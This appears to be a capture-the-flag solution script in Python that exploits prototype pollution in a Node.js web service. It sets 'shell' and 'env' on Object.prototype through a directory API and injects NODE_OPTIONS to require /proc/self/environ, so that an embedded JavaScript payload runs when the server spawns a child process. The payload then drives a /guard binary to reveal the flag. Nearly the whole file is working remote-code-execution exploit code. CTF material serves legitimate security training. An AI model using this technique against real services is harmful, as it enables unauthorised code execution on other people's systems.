#!/usr/bin/env python3

import sys
import json
from requests import get, put, post

FLAG = 'ALLES{Gr3ta_w0uld_h4te_th1s_p0lluted_sh3ll}'

# this is the JavaScript shell that will be executed.
# it talks to the guard executable, solves the captcha
# and prints the flag
SHELL = ''
#         trim argv to avoid node failing while our shell runs
SHELL += 'process.argv.length=1;'
#         execute the guard
SHELL += 'p=require("child_process").spawn("/guard");'
SHELL += 'o="";'
SHELL += 'p.stdout.on("data",d=>{'
#             collect the guard's output
SHELL +=     'o+=d;'
SHELL +=     'if(o.includes("=")){'
#                 solve the guard's captcha
SHELL +=         't=o.split("=")[0];'
SHELL +=         'a=eval(t);'
#                 give the answer
SHELL +=         'p.stdin.write(a+"\\n");'
#                 ensure we don't answer more than once
SHELL +=         'o="";'
SHELL +=     '}'
SHELL += '});'
SHELL += 'p.on("close",_=>{'
#             print the output (including the flag)
SHELL +=     'console.log(o);'
#             exit cleanly (otherwise node might hang)
SHELL +=     'process.exit(0);'
SHELL += '})'
#         comment out the stuff that comes after this in /proc/self/environ
SHELL += '//'


def check(predicate, msg=None):
    if not predicate:
        if msg is not None:
            print(f'CHECK FAILED: {msg}')
        else:
            print(f'CHECK FAILED')
        exit(1)
    elif msg is not None:
        print(f'PASSED: {msg}')


def set_value(base, path, value):
    headers = { 'Content-Type': 'application/json' }
    data = { 'value': value }
    url = f'{base}/api/directory{path}'
    return put(url, headers=headers, data=json.dumps(data))


def get_stats(base):
    return get(f'{base}/_debug/stats')


def exploit(base):
    # check if site is available
    r = get(f'{base}/')
    check(r.status_code == 200, 'GET / == 200')

    # add `shell` to Object.prototype
    r = set_value(base, '/__proto__/shell', 'node')
    check(r.status_code == 200, 'set the shell option')

    # add `env` to Object.prototype
    r = set_value(base, '/__proto__/env', {
        # start the key with 'A' to ensure it comes before the other one
        'A_SHELL': SHELL,
        # execute the env vars file, which we apparently have control over!
        'NODE_OPTIONS': '--require /proc/self/environ',
    })
    check(r.status_code == 200, 'set the env option')

    # cause the call to `child_process.spawn`
    # that uses a polluted options object
    r = get_stats(base)
    check(r.status_code == 200, 'cause the execution')

    check(FLAG in r.text, f'get flag: {FLAG}')


def main():
    if len(sys.argv) != 2:
        print(f'Usage: {sys.argv[0]} <base-url>')
        exit(1)

    base = sys.argv[1]
    exploit(base)


if __name__ == '__main__':
    main()
